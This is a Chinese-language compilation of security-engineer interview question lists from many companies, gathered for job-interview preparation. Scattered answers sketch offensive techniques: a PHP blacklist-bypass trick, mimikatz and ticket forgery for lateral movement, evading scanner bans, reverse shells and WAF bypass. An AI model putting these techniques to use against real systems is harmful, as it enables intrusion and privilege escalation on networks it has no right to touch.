10. 一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名
11. 还有没有其他的资产收集的经验
12. 除了信息收集，有没有什么漏洞方面的攻击案例
13. 聊一下sql注入
14. 怎么防御
15. 遇到order by时怎么防御
16. 用转义字符防御时，如果遇到数据库的列名或是表名本身就带着特殊字符，应该怎么做
17. 宽字节注入
18. ssrf了解吗
19. 怎么修复
20. 基于黑白名单的修复，现在的生产基本都是用的docker，ip是随时变的，而且docker重启后可能什么都不一样了，怎么做一个修复
21. fastjson反序列化
22. redis的漏洞
23. mysql的提权
24. shiro反序列化
25. 最近很火的log4j，聊一下原理
26. jndi的解析流程和原理
27. 有没有什么你做的比较好的地方我没有问到的，可以聊一聊
28. 惯例介绍部门的主要业务
29. 惯例反问

# 二面

> 紧接在一面plus后，就隔了10分钟，一面复盘写一半就开始二面了

时长：25分钟

1. 聊攻防演练中比较得意、印象深刻的一次经历
2. 安全领域比较擅长什么
3. 审的一般是什么，java？python？
4. csrf了解吗，怎么做一个修复
5. 在拿到java系统的代码时，审计的流程是怎样的
6. java系统中的sql注入怎么做一个防御和修复
7. 在浏览器中输入一个域名去访问时，浏览器做了什么
8. 一个系统的登录页，通常可能出现什么漏洞
9. 云安全了解吗
10. 有做过安全工具的开发吗，比如waf或者扫描器之类的
11. 惯例介绍业务
12. 惯例反问

# 0x05 长亭科技-安全服务工程师

# 一面

时长：30分钟

1. 自我介绍
2. web渗透测试有没有过实战
3. 讲一下sql注入原理
4. 有没有从代码层面了解过sql注入的成因（反问代码层面指的是不是sql语句，答是）
5. 了不了解xss，有没有从代码层面了解xss的原理
6. 对owasp top10漏洞哪个比较了解
7. 讲一讲怎么防御sql注入
8. sql注入怎么绕过过滤
9. 问了护网时xx有没有成为靶标，有没有对攻击队行为做过研判
10. 在xx护网时的工作内容，有没有做过流量包、数据包的研判
11. 学校攻防演练时担任的角色，主要工作内容，渗透测试的思路，有什么成果（这个问的还是挺细的，具体到分配的任务、有没有拿下主机或者域控、攻防演练的形式和持续时间等都聊了）
12. 平时ctf打的多不多，有什么成绩
13. 平时会不会关注一些新颖的漏洞，会不会做代码审计，比如shiro漏洞等有没有做过漏洞复现
14. 对钓鱼邮件这些有没有什么了解（因为上面聊xx护网时说了钓鱼邮件和微信钓鱼的事）
15. 目前学习的方向是什么
16. 最后介绍人才需求
17. 反问环节

# 二面

时长：34min

1. 自我介绍
2. 学代码审计偏哪个语言？擅长哪个语言
3. 拿到一份php代码做审计，审计的流程大概是怎样的
4. 对php开发框架熟吗？比如ThinkPHP这些
5. 给的源码是ThinkPHP框架的话，审计起来和没有使用框架的有什么不同，从流程上或者从关注的点上有什么不同
6. php原生的敏感函数有哪些，比如搜关键字的话会搜哪些
7. 反序列化漏洞了解吗
8. 反序列的时候，unserialize()反序列一个字符串的时候，对象会有一些魔术方法会被自动调用到，在找反序列化的链时，有哪些魔术方法是可以作为一个入手点去找的
9. 有没有审计过实际的项目，比如github上一些开源cms
10. java审计可以聊一下吗
11. 之前做渗透时有没有做过完整的项目，除了ctf
12. 能不能说一些找到的漏洞，怎么找到的
13. ssrf这类的漏洞熟悉吗，说一下原理和利用方式
14. 我们利用ssrf可以做什么，达到什么效果
15. 在php环境下，怎么最大程度的利用ssrf，拿到shell或者进内网
16. 怎么利用内网的机器请求内网中的服务
17. ssrf漏洞的修复建议，修复的时候需要注意哪些细节
18. 如果用白名单策略修复ssrf，从用户输入的变量里拿出要访问的目标，这个要注意哪些，因为一些url会通过特殊的字符做白名单绕过，对取变量这个操作有哪些要注意的细节？
19. php中三个等号和两个等号有什么区别
20. php代码常见入口函数怎么找
21. 有一些php的开发框架可以帮我们做一些url路由，对这些路由的方法熟悉吗
22. 介绍下PHP的变量覆盖
23. 有一个php的程序，本身就允许文件包含的操作，同时想要避免文件包含漏洞，写代码的时候要注意哪些
24. 远程文件包含和本地文件包含，这两种涉及的php设置有什么
25. 本地文件包含能不能通过php配置限制文件包含的路径（不通过代码直接通过配置项来解决）
26. php、java代码审计对哪个漏洞特别熟悉
27. php在做sql注入防御时有哪些方法
28. java做sql注入的防御
29. sql的二次注入了解吗，能介绍一下吗
30. 写代码的时候怎么防止二次注入

# 0x06 天融信面试复盘

时长：15~20分钟

1. 有没有做过现实环境的渗透测试？有没有提交过src？
2. 对免杀技术了解多少，制作的木马能不能过360
3. ctf的成绩？擅长什么方向的题？
4. 攻防演练有什么成果？
5. shiro漏洞了解吗，讲一下原理
6. 在linux下，现在有一个拥有大量ip地址的txt文本文档，但是里面有很多重复的，如何快速去重？
7. 在内网渗透中，通过钓鱼邮件获取到主机权限，但是发现内网拦截了tcp的出网流量，聊一下这个时候应该怎么进行通信？
8. 代码能力怎样，平时有没有做过代码审计？
9. 目前对什么方向感兴趣？

# 0x07 腾讯-安全技术实习生

时长：15分钟

1. 自我介绍
2. sql注入了解吗，讲一讲二次注入的原理
3. 二次注入要怎么修复
4. sql注入过waf了解吗，若一个sql注入过滤了information关键词，怎么绕过
5. Redis未授权访问
6. 渗透测试的一个完整流程
7. 打ctf的时候有没有遇到什么印象特别深的题目
8. 文件下载漏洞有没有什么比较好的利用方式
9. 利用文件下载漏洞找文件名具体是找什么文件名（读取文件一般会读取哪些文件）（ctf中？实战中？）
10. 命令执行漏洞，http不出网有什么比较好的处理方法（发散一点说）
11. 接上一题，通过隧道通信，详细讲讲通过什么类型的隧道，讲讲具体操作
12. 漏洞预警
13. 有没有复现过中间件类型的漏洞（有没有完整的复现过漏洞）
14. 在学校的攻防演练中扮演的角色的主要职责是什么

# 0x08 小鹏汽车-安全工程师

时长：37分钟

1. 自我介绍
2. 有没有挖过src？
3. 平时web渗透怎么学的，有实战吗？有过成功发现漏洞的经历吗？
4. 做web渗透时接触过哪些工具
5. xxe漏洞是什么？ssrf是什么？
6. 打ctf的时候负责什么方向的题
7. 为什么要搞信息安全，对安全这一块有多大的兴趣，以后会不会转行，还是打算一直从事安全方面工作
8. 自己平时怎么学安全的，如果让你做一个新的方向（app安全），会投入多少时间去学习，还是说有自己想做的方向
9. 聊一聊代码审计的流程
10. 平时是怎么做代码审计的
11. 有没有审计过开源框架、CMS？
12. 怎么判断一个数据库是mysql还是oracle的？
13. sql注入的种类，利用方式？
14. 聊一聊sql注入的原理及防御思路
15. 做开发的时候用的是什么语言
16. 做java开发的时候用过什么框架，能不能做java安全开发
17. 有没有做过安卓开发
18. 有没有用python写过工具？
19. msf利用的是哪个漏洞，有没有成功反弹？
20. 护网的时候主要做了些什么，聊一聊对安全产品的理解
21. 公司现在需要做app安全的人，现在要你做的话，你会去学吗，或者说感兴趣吗，还是说有别的想做的，不想做app安全，能投入多少时间去学
22. 内网渗透了解吗？聊一聊内网渗透的思路



------



> 接下来从0x09~0x0B都是同一位博主的面经，发在牛客上，看了下感觉很不错就转过来了，再附上这个博主的一些面试题/学习笔记的链接，个人觉得挺好的
> CSDN 网络安全-常见面试题
> CSDN 网络安全-自学笔记

# 0x09 阿里巴巴-阿里云安全

作者：宠你＆我的天性

链接：
https://www.nowcoder.com/discuss/642461?source_id=profile_create_nctrack&channel=-1

来源：牛客网

# 一面

1. 自我介绍一下，讲一下课题和课外实践？

2. WAF管理平台后端API有做过压力测试吗？

3. 你现在的论文已经发表了吗？

4. 你的毕业论文是什么？

5. 在字节跳动训练营最大的收获是什么？

6. 在研究生期间或日常生活中有什么可以分享的有意义的事情？

7. 快排的时间复杂度是多少？

8. 1. 最快的情况下是多少？是什么样的情况？
   2. 最慢的情况下是多少？是什么样的情况？

9. 哈希冲突有哪些解决办法？

10. 编程题(easy)

# 二面

1. 自我介绍一下？

2. 我们这里是密码管理服务，密码这块你了解多少呢？

3. 你未来计划更偏向于安全研究还是安全研发？

4. 你对云上PKI的安全，身份认证的能力感兴趣吗？

5. 介绍一下字节跳动训练营做了什么？

6. 1. Sql注入的原理和防御方案有哪些？
   2. WAF防护SQL注入的原理是什么？
   3. 本次训练营中，怎么分工协作的？你的角色是什么？你的贡献是什么？有没有提升效率的可能？
   4. 漏洞挖掘是纯工具还是有一些手工的？
   5. WAF管理平台后端API有哪些功能？
   6. WAF的增删改查数据量大吗？
   7. Redis解决了什么问题？
   8. 热点数据怎么保证redis和db中的一致？
   9. 用户登录认证是怎么做的？
   10. Token的安全怎么保护？
   11. Token的内容该如何设计？
   12. 怎么保证数据不被篡改呢？

7. SDN漏洞挖掘的思路？

8. 1. 漏洞挖掘有挖掘出RCE漏洞吗？
   2. 对栈溢出、堆溢出有研究吗？

9. 说一下https协议的过程？

10. 1. 随机数一般有几个？
    2. 如果有一个的话会如何？

11. 对C++或C熟悉吗？

12. 哈希表的原理和冲突解决办法？（和一面重复了）

13. Mysql查询快的原因？

14. 1. 事务的四大特性，mysql隔离级别？
    2. 解释一下乐观锁和悲观锁？

15. 多并发编程有涉及过吗？

16. 1. 读写锁和互斥锁/排他锁用过吗？有什么区别？为什么会用？

17. 有一项软件著作权，做的什么软件？

18. 编程题(medium)

# 三面（交叉面）

1. 字节跳动训练营越权问题解决办法？

2. 1. 防火墙都是自己写的规则去防御吗？
   2. 任务都是一样，你们得了第一，你们团队做的好的地方在哪里？

3. SDN漏洞挖掘项目，你能列举一个比较有技术含量的漏洞吗？漏洞原理和挖掘过程？

4. Python2和Python3的区别？

- Xrange和range返回的是什么？

1. 数据库索引的作用？mysql索引的变化？
2. 数据库弱口令，登进去后如何提权？
3. 你自己写项目的时候，怎么进行的 SQL注入防御？
4. 怎么进行CSRF防御？

- Token加密什么东西？
- 校验什么？
- Token为什么需要加密？
- 使用明文随机数可以吗？

1. 怎么防重放攻击 ？
2. Docker有哪些安全上的好处？
3. 个人发展方向？
4. 当前在哪里日常实习？
5. 实习多久了？为什么想来阿里？

# 0x0A

# 0x0B 字节跳动-无恒实验室

部门：无恒实验室

岗位：安全工程师

作者：宠你＆我的天性

链接：
https://www.nowcoder.com/discuss/749954?source_id=discuss_experience_nctrack&channel=-1

来源：牛客网



------



1. 自我介绍
2. 阿里巴巴实习介绍？
3. 启明星辰实习介绍？
4. 消息队列是自研的，还是开源的？叫什么名字？
5. 任务下发？状态监测
6. 子域名扫描插件怎么写的？
7. 指纹识别插件怎么写的？
8. wappalyzer怎么进行指纹识别的？
9. CSDN的XSS漏洞挖掘过程？
10. SQL注入的原理？
11. 目前防御SQL注入的方式有哪些？
12. 有哪些SQL语句无法使用预编译的方式？
13. SQL注入如何判断注入点？
14. 已知http://example.com/?id = 1，是mysql，如何获得mysql版本？
15. 无回显情况下怎么弄？ceye dnslog外带
16. 除了外带呢？
17. CSRF的原理？
18. CSRF使用POST请求时，如何攻击？隐藏表单
19. 不是表单呢？
20. AJAX发送POST请求？
21. Ajax发送POST请求会发几个数据包？
22. 让你来写一个CSRF攻击插件，你怎么写？包含哪些模块？
23. SSRF的原理？
24. 让你写一个SSRF插件，你怎么写？
25. 反问环节

# 0x0C 58同城-安全工程师

岗位：安全工程师

作者：Lamber-maybe

链接：
https://www.nowcoder.com/discuss/766311?source_id=discuss_experience_nctrack&channel=-1

来源：牛客网



------



1. 你先做个自我介绍吧

假如说有个SQL注入如下

```
select * from user where userid = {};
```

1. 这种情况下如何注入?

2. 1. response里面没有返回内容
   2. 1s就超时了，直接返回404页面

3. 比如说我写一个安全SDK

sql注入的修复, 怎么写(伪代码)

1. 1. 答：我倾向于使用预编译的方式

但是预编译的话, 研发可能不会用怎么办呢, 就是说如果他觉得改起来太麻烦了能不能更方便一点. 因为预编译的话, 我每条SQL每条查询都得去改.

1. 1. 答：那设计一个白名单怎么样呢
   2. 那你大概写一下怎样设计一个白名单. 你可以分场景, 比如说什么场景什么场景的SQL注入, 或者是参数里面应该做什么操作
   3. xss的修复, 怎么写(伪代码) 答: 用实体化转义

但是我们有一个场景啊, 你看我们上传简历这里, 有时候会支持上传html的简历, 对吧. 他本身业务就需要用到html, 如果用html实体化转义的话, 他全都会被转义, 那这样的话业务就崩了嘛, 对不对. 那这种情况下我们要怎么样去写一个xss的过滤, 或者是说转义, 去解决这个类似于简历这个场景. 你可以想一想, 写不出来代码也没关系.

1. 1. 答：白名单限制, 黑名单过滤.
   2. 其实我们自己是这样做的, 对于这种情况, 我们第一是会做一个html标签的白名单, 第二是事件的白名单. 黑名单我们就不搞了.

rce的修复, 怎么写(伪代码)(java或者python的命令执行) 答: 白名单限制, 只允许需要的函数. 但RCE的话我感觉在业务场景当中, 一般来说也不是很容易出现 面试官: 欸, 我们就出现了很多. 尤其是运维部门.

1. 1. 我: 我打CTF比较多, 我了解的RCE都是PHP方面的. 比如说system, popen之类的. 一般来说都是直接做过滤

那PHP中这些函数全部被黑名单了, 你还有什么方法

1. 1. 答: 字符串拼接 $a=p.h.p.i.n.f.o()

你有没有用过php里面的反引号啊

1. 1. 答: 还有用 chr() 函数来绕过
   2. 面试官: 编码是吧
   3. xxe的修复, 怎么写(伪代码) 答: 对XXE来说, 我只了解他的攻击方式, 对他的防御不是很了解. 攻击方式就是做XML的外部实体化注入. 一个攻击模板, 可以读文件, 可以做命令执行
   4. XXE怎么做命令执行呢, 就拿php来说, XXE怎么做命令执行
   5. XXE这个命令执行是要他的服务端本身支持某些特殊的协议, 一般来说是不行的

了解过自动化代码审计的工具吗, 类似于fortify这种

1. 答: 我只用过那个一个比较老的那个, 我想不起来了(指seay)

没关系, 那你有没有了解过他的一些原理, 大概怎么做的

1. 我: 他原理一般都是通过匹配一些特殊函数, 去定位可能出现漏洞的函数的位置

但这种的话他误报很高欸, 就像我这种RCE的话, 你直接匹配的话他很多都是误报了, 很多他都不是web思路的

1. 我: 还有一种是, 给他加一些自定义规则

那有没有更好的办法呢, 误报太多了我们没办法接受啊

1. 我: 我有一个想法就是, 他自己匹配了之后, 能不能从前端从一个黑盒的层面再去验证一遍

2. 那黑盒验证, 我就有需求是, 首先我得知道, 首先我php里面我这个函数到底是哪个入口传进来的, 对吧. 但这个有可能经过了层层调用, 甚至有可能是include()这种, 那这种的话, 对于我来说 , 我并不知道他影响到了哪一些入口, 这种情况怎么办呢

3. 你们学校有学编译原理吗

4. 其实我觉得安全专业还是要学一下编译原理

5. 有没有搞过linux的这种后渗透相关的

6. 1. 面试官: 比如这个linux被我攻陷了, 我想去拿到更多的信息, 比如说一些横向的信息, 那种有没有搞过 我: 这种不是很了解, 但windows的会一点
   2. 面试官: 那你可以简单讲一下, 比如你先攻陷一台windows的机器, 然后我想在这个windows的域内去做一些横向移动, 我想把这个windows的域的权限给拿到, 这种你该怎么做 我: 通过票据伪造, 白银票据和黄金票据 面试官: 你这个票据伪造要怎么做呢 我: 一般用mimikatz就可以了吧
   3. 面试官: 你mimikatz抓取的是内存里面的密码和一些他的票据, 那我如果本身是低权限的呢, 就我本身抓不了密码, 或者我抓到的用户密码并不是域账号的, 是一个低权限账号呢. 因为大部分渗透进来都是个应用, 应用他可能并没有域权限 我: 从低权限往上提
   4. 面试官: 那你一般会怎么提权 我: 一般windows的漏洞吧 面试官: 那现在就用这个windows系统的提权, 我现在就一个webshell, 那我怎么样去提权
   5. 面试官: 你可以这样嘛, 你上传一个提权的脚本或者exe嘛, 你webshell去跑这个exe, 他就把这个web应用权限提权了

7. 那你最后有什么想问我的吗

# 0x0D 腾讯-玄武实验室

作者：立志区块链安全的菜鸡

链接：
https://www.nowcoder.com/discuss/711602?source_id=discuss_experience_nctrack&channel=-1

来源：牛客网

部门：玄武实验室

1. 自我介绍

2. 讲解一下CSRF原理吧

3. 什么时候接触web安全的

4. 为什么学WEB安全

5. 参加过哪些比赛

6. 你发挥了那行作用

7. 讲讲反序列化吧

8. 说一说最近你关注的安全圈大事

9. 那你说说你遇到最优印象的吧

10. 我看你简历上有黑盒测试 说一说吧

11. 1. 一个是钱包的测试 一个是交易所的测试，钱包主要是信息泄露，水平越权

12. 怎么发现的

13. 1. 信息泄露是webpack可以直接查看api 等调用信息，水平越权是构造josn包返回了用户数据账户密码之类的

14. 怎么构造的

15. 那继续说说交易所

16. （区块链相关）讲一讲逆向函数涉及到的接收参数的指令集

17. 说说重入漏洞

18. 有对最近那个最大的区块链安全事件有了解吗

19. 好，那你对密码学有什么接触嘛

20. 我看你简历有许多对Defi的审计，那你有什么对漏洞的挖掘的经验吗

21. 嗯好 那现在我问你个问题 你思考下 在DEFI项目中建立了各种各样的经济模型 怎样才能找出可能存在的漏洞

22. 讲讲你对未来可能出现的新型漏洞的猜想吧

23. 有一种 游戏在猜对正确答案后可获得奖励

24. 反问

# 0x0E 360-安全工程师

作者：Djade

链接：
https://www.nowcoder.com/discuss/628090?source_id=discuss_experience_nctrack&channel=-1

来源：牛客网

1. 自我介绍
2. WAF及其绕过方式
3. IPS/IDS/HIDS
4. 云安全
5. 怎么绕过安骑士/安全狗等
6. Gopher扩展攻击面
7. Struct2漏洞
8. UDF提权
9. DOM XSS
10. 数据库提权
11. 怎么打Redis
12. 内网渗透
13. 容器安全
14. k8s docker逃逸
15. linux、windows命令：过滤文件、查看进程环境变量
16. 站库分离怎么拿webshell

# 0x0F 快手-安全实习生

作者：ArrowQin

链接：
https://www.nowcoder.com/discuss/651317?source_id=discuss_experience_nctrack&channel=-1

来源：牛客网

部门：系统运营部

# 一面

1. 自我介绍
2. 问项目
3. 针对项目问了很多详细的问题，不便透露，通用问题如下：
4. 做项目的时候有没有遇到什么问题，怎么解决
5. 做项目学到了什么东西
6. 项目中有没有什么地方自己做过优化
7. 有没有对网站做过渗透测试
8. Linux操作熟悉吗，怎么看进程PID
9. 用过什么数据库，答：sqlite,mongodb,面试官好像不太了解没咋问
10. 为什么用mongodb
11. 了解ES吗(Elasticsearch)
12. HTTPS建立过程
13. python怎么管理内存
14. 深拷贝和浅拷贝区别
15. python多进程、多线程、协程有用到吗，都在什么地方用到
16. python可以实现真正的多线程吗
17. 代码题：ip排序

（转成元组排序就行了，记得把str转成int，不然192会比50大）

```
输入：iplist = ["1.1.1.1","192.168.1.110","10.192.2.4","10.50.2.3","10.50.2.10","111.120.12.1","172.18.5.112"]输出：1.1.1.110.50.2.310.50.2.1010.192.2.4111.120.12.1172.18.5.112192.168.1.110
```

1. 写Web API的时候怎么防止SQL注入
2. 怎么防XSS
3. 了解越权漏洞么，有没有挖过越权漏洞
4. 有没有什么比较擅长的我还没问到的

# 二面

1. 问项目
2. 项目哪一块时间花的比较多
3. 怎么溯源攻击
4. 举一个溯源攻击的例子
5. 怎么检测webshell
6. sql注入在mysql和sqlserver中有什么区别
7. 想找安全开发的岗位还是安全研究的岗位

代码题：手机九宫格键盘，输入数字，输出所有的字母组合

1. 如输入23，输出['ad','ae','af','bd','be','bf','cd','ce','cf']
2. 讲一下DNS协议的作用、解析过程
3. DNS协议的安全问题
4. 实习时间

# 0x10 华顺信安-安全服务工程师

来源：知乎

链接：
https://zhuanlan.zhihu.com/p/426763642

1. 自我介绍
2. 红蓝队经验
3. 关于shiro漏洞了解多少
4. 说说你APP测试的经验
5. xposed用的什么框架，有没有自己写过app解密
6. Xss、SSRF、SQL 产生的原因，修复方案？
7. 如果你Xss打了后台，发现是内网的怎么办
8. 假设给你一个目标站，你要怎么做？
9. linux和windows提权知多少。
10. 会不会进程注入？
11. 做过几次应急？
12. 讲讲windows和linux应急你咋做的
13. 用过没用过我们家的goby和fofa?
14. 会不会apk反编译？
15. 你python水平咋样？
16. 你php怎么审的



------



> 备注：从0x11~0x14都是同一位师傅的面经，来源于知乎，里面有这位师傅的回答及一些总结、知识点，我这只是选了几个个人认为比较有代表性的公司和面经的题目出来
> 来源：知乎
> 链接：
> https://zhuanlan.zhihu.com/p/164774894

# 0x11 奇安信面试复盘

1. MVC框架详细说一下
2. 详细介绍一下sql注入
3. xss与csrf的区别
4. csrf的原理以及如何防范
5. 还有什么你擅长的但是没有问到的吗
6. 讲一下xxe的原理
7. xxe会用到哪些函数
8. 文件上传，详细说说
9. 常见的web容器有哪些
10. apache 7.0 文件上传黑名单怎么绕过，详细说说
11. 密码学的对称密码与非对称密码有哪些
12. md5是不是对称加密
13. apache可以执行php文件吗
14. 了解哪些数据库
15. 说说反序列化的原理
16. 反序列化会用到哪些函数
17. xxe有没有实战过
18. java的多线程
19. python有过哪些项目，写过什么东西
20. 之前python学到什么地方

# 0x12 京东-安全研发

1. 首先根据简历提问
2. 问我的一个项目完成的怎么的样了，//简历中的
3. Java基础怎么样，
4. 有没有自己动手写过一些工具
5. 有没有想过自己以后要写一下扫描器
6. sql注入的简单原理及其如何防御
7. 有没有了解过反序列化 尤其是Java方向的
8. 数据结构还记得多少
9. src主要挖掘一些什么类型的漏洞
10. 了解的MSF框架怎么样
11. 数据库主要了解的哪些，主要学的什么数据库
12. ssrf的原理及其防御 ---> 这有深入

# 0x13 安恒面试复盘

1. sqlmap爆出当前库名的参数是什么？
2. namp探测系统的参数是什么 --->大写还是小写
3. namp的小写o与a是干嘛的
4. 布尔型盲注的具体语句是什么
5. 宽字节的原理
6. python有没有反序列化
7. get传参与post传参的区别
8. Http有哪些请求方式
9. 如何判定cdn与cdn的作用
10. 如何确认服务器的真实IP
11. 详细说了说信息收集过程
12. 一串编码如何确认是base64
13. 栅栏密码的原理是什么
14. base64与md5如何区别
15. oracle的默认端口是多少
16. mysql的管理员密码一般放到哪
17. 如果substr()函数被禁用，你脑子里有多少替换函数
18. redis如何拿下，哪个端口，具体语句，具体操作
19. 如何通过邮箱知道对方的IP
20. 说一下同源策略
21. 如何收集网站管理员邮箱等等
22. ssrf有哪些危害
23. 如何防御ssrf-->问的较深---->建议在详细了解一下
24. Linux的某两个文件怎么分辨（忘了具体是哪两个文件了）
25. MSF框架稍微问的深入了一些
26. web容器（中间件）有哪些解析漏洞与原理
27. 如何防范sql注入 --->这问的很深

# 0x14 浙江东岸检测

1. xss的标签
2. 说说大学这几年，你最自豪的事情
3. 简单说说sql注入
4. 说说偏移注入
5. 说说ctf你都做哪些题型
6. 遇到的比较困难的web题型的ctf题目
7. xxe了解吗，有没有自己审计出
8. 说说反序列化
9. bypass说说
10. 假如，让你设计一个waf，你会怎么设计
11. 内网渗透与提权了解吗
12. 平常都挖掘哪些src
13. 有没有自己手写过一些脚本
14. 说说sql注入，手工怎么爆出所有库名字

# 0x15 360-安全工程师实习

时长：45min

来源：知乎

链接：
https://zhuanlan.zhihu.com/p/362868972

1. 自我介绍
2. WAF及其绕过方式
3. IPS/IDS/HIDS
4. 云安全
5. 怎么绕过安骑士/安全狗等
6. Gopher扩展攻击面
7. Struct2漏洞
8. UDF提权
9. DOM XSS
10. 数据库提权
11. 怎么打Redis
12. 内网渗透
13. 容器安全
14. k8s docker逃逸
15. linux、windows命令：过滤文件、查看进程环境变量
16. 站库分离怎么拿webshell

# 0x16 某一线实验室实习

来源：知乎

链接：
https://zhuanlan.zhihu.com/p/426747686

# 技术面

1. 面试官：你好，听说你对来我们公司的意愿非常强烈，是为什么呢？我：因为我在项目中与贵公司的人员有过合作，感觉无论是技术还是硬件或者是待遇都算圈子里一流的
2. 面试官：那你了解我们实验室吗？我：我有了解过，巴拉巴拉说了一下
3. 面试官：那我先给你介绍一下实验室的方向，分为三个方向…. 我：好的明白了
4. 面试官：你在项目中是否使用过我们公司的设备，感觉使用体验如何（意思就是让说设备的优缺点） 我：那我就实话实说了？
5. 面试官：没问题的，我就想听听你的意见 我：我使用过…. ,优点就是性能好，能探测到更多的威胁情报之类的（大家脑补吧），感觉不足的就是探测和分析出的威胁，没法给出具体的流量片段，没法通过一个设备有效确定攻击，没有流量特征不好和其他全流量设备进行联动，可能是设备出场的保护机制，保护特征库不被外泄。
6. 面试官：你知道主流的设备原理和开发过程吗 我：（我就说了一下原理，还不知道对不对）
7. 面试官：你在项目中是做过流量分析对吗？能不能说说你的具体案例 我：我在国家hvv中协助发现过0day，单独发现过frp反弹定时回确认包向外输送流量，shiro反序列化等漏洞（我主要讲了我frp反弹的发现思路和流程）

面试官：除了这些常规的特征发现，你自己还有什么快速确定的方法吗？我：（给大家分享一下我自己的流量分析心得） 1.确定事件的类型（确定事件是什么样的攻击，比如sql注入和爆破和frp的流量分析步骤就不一样） 2.确定事件的时间，首先划定一个时间段 3.确定数据流，攻击的数据流我们是要看HTTP，TCP，还是ssh 4.分析是内网—>外网还是外网—>内网，内网和外网时两种查询方法，正确的查询能有效的通过分析更少的数据包获取结果 比如 内网—>外网 我们确定后，第一步肯定先去先查看外网ip的流量，判断行为 外网—>内网 这样一般都是拿下了一个外网的服务器当做跳板机，我们肯定要先去分析内网的受害者服务器，看看有没有被攻击成功

```
首先我们需要确定到攻击行为后，再深入的流量分析和应急响应，很多都是误报        数据包的大小也是分析的条件，分析SSL数据包需要解密        爆破攻击：        SMB,SSH,MSSQL等协议比较多，看包的大小，成功登陆的包很大        看ACK，SYN包的次数，如果成功至少20起步，放到科莱上为40起步，但是注意不是失效包和重传的包（注意加密流的ack和syn包也很多，为客户端一次，服务端一次）        重传攻击：        如果一个数据包非常大，几个G或者一个G，我们就考虑数据包是否进行了重传，然后查看数据包的重传数，打个比方就是刷新，如果短时间重传数非常多，就为机器操作，判定为攻击        我们发现一个攻击（如平台登录后的sql注入）我们可以通过流量回溯装置抓取那个被登录用户的用户名和密码，登录平台后自己利用发现的payload进行尝试，看是否能注入成功
```

1. 面试官：听说你还做过红队？是哪个项目，你在里面的职责是什么？我：介绍了一下我的项目经验，然后说我在红队的是突击手负责打点（我们当时孤军奋战没后援，也没擅长内网的选手）
2. 面试官：说说你项目中的成果 我：….
3. 面试官：说一下你在项目里遇到的问题 我：我们通过exp拿下了一个锐捷路由器的webshell，但是卡在了反弹shell上面，无法进行反弹
4. 面试官：那说一下项目结束后你是否有思考过这个问题，是否咨询过他人，解决方式是什么？（我感觉真的非常重视思考和问题解决，非常重视项目的闭环） 我：我有问过也拿过锐捷路由器的朋友，然后我认为是数据库和网站分离开了，然后只能拿下来webshell权限
5. 面试官：你如何快速准确的确定资产？我：通过fofa，谷歌语法，钟馗之眼，一些的注册信息
6. 面试官：fofa的语法是什么？
7. 面试官：你如何在这些资产中快速的确定漏洞？我：最快的就是扫描器先扫描一遍，然后进行信息搜集，针对性的攻击，或者我们通过fofa语法针对性的在资产表中搜集是否存在特殊的cms或者oa系统….
8. 面试官:一般扫描都会封禁你，你会怎么办 我：我会第一就是使用ip池代理，要么就是使用5g
9. 面试官：你这些信息搜集和攻击都是效率不是很高的，项目结束后你有没有思考解决方法呢 我：我有想过自己写一个程序，把代码池和一些信息搜集和特定的利用方法融合，但是没写出来（又一次感到代码不好的痛苦）
10. 面试官：那你是否有了解过国家hvv红队的隐藏流量过防火墙的技术呢？我：有了解过，但是这个我不太会，没有地方去学（有点尴尬）
11. 面试官：你们在打点的时候有没有什么特殊的方法呢？我：我们除了搜索特点的oa系统，还会搜集资产里的邮件系统，进行信息搜集登录邮件系统，搜集各种配置文件数据库文件登录网站后台，我们成功登录到两个网站后台，和一个邮件系统，也拿下了几个oa
12. 面试官：你们这么针对特定oa，是因为有0day吗（笑） 我：我们队有这几个oa的0ady和半day
13. 面试官：开发这边怎么样？能直接上手开发吗？我：python还能自己开发几个小工具，java还是只能看懂（好尴尬我真不行，可能是学安全时间还不够长，本来想今年主攻代码的）
14. 面试官：意思就是只能开发几个简单的扫描脚本对么（大家一定啊要好好学代码） 我：是（尴尬的笑），最近在学习使用pos3编写poc
15. 面试官：你如果来实习你想进行哪方面的学习呢？我：（我选择了一个偏向防御类的方向，因为我知道攻击类的我应该水平不够，我很有自知之明） 然后就是一些询问能工作几个月，什么时候能到岗

> 综合下来我认为面试官认为我的不足就是，红队时的攻击和信息搜集效率不高需要改进，可能缺少一点项目的反思和解决思路

# hr面

1. 首先介绍一下你自己的经历？
2. 你才大二该大三，你在学校是怎么自学安全的？
3. 你是怎么接触安全的？
4. 你现在的学习内容是什么？
5. 近期的学习规划是什么？
6. 你在大学中平时课程和安全的学习是怎么分配的？是否会冲突？

# 0x17 腾讯-科恩实验室实习

# 一面

时长：一个半小时

1. tcp三次握手

2. 介绍一次渗透测试过程

3. 1. 讲了一次代码审计

4. SSRF漏洞

5. 内网渗透大致流程

6. 再介绍一次难度比较高的渗透测试

7. 防守方有哪些入侵检测手段，有哪些痕迹是可以抓到的‌

8. 介绍进程和线程

9. 进程和线程内存空间的关系

10. 父子进程的介绍

11. 孤儿进程和僵尸进程

12. 1. 这个我讲反掉了

13. kill一个进程的时候，都发生了那些事情，从父子进程角度讲

14. 反弹shell的几种方式

15. 1. 本质是用tcp协议传输bash程序

16. att&ck矩阵的类别，介绍其中的CC

17. 到域名下拿到命令执行的结果

18. 1. 这部分没听清楚，面试的时候直接说了不知道，复盘听录音还是没怎么听清，但好像大概想问的是DNS域名解析获取命令执行回显

19. Linux命令通配符

20. 护网的溯源、威胁分析工作之类的问了十分钟左右

21. 1. 完全不会，以后简历上再也不写护网了

22. xx攻防演练中防守方有哪些手段，问的比较杂，主要就是问入侵痕迹检测和溯源之类的东西

23. 1. 这部分也不太会

24. SVM、KNN介绍

25. 卷积神经网络介绍

26. 莱文斯坦距离

27. 搜索引擎算法

28. 1. 不太了解，大概讲了下字典树

29. 倒排索引

30. 恶意样本给出函数家族的md5，如何进行分类

31. 1. 从统计规律讲了下

32. 反问

# 二面

时长：半小时

1. 第一个问题就直接问了护网，和一面问的差不多，直接裂开

2. Linux开机自启动方式

3. init.d脚本介绍

4. Linux怎么查看程序调用了哪些文件

5. 如何监控Linux文件操作

6. 1. 问到这里就已经非常慌了，Linux比较进阶的操作都不是很会，而且面试官一直在叹气我日

7. Linux有哪些系统调用

8. 1. 不会

9. GDB调试

10. 1. 不会

11. 查看Linux开放的网络端口、多线程状态

12. 反弹shell的方式

13. Linux下怎么隐藏文件

14. 子域名收集

15. DNS重绑定

16. DNS解析的流程

17. CC流量

18. 1. 听都没听过

19. ssh隧道

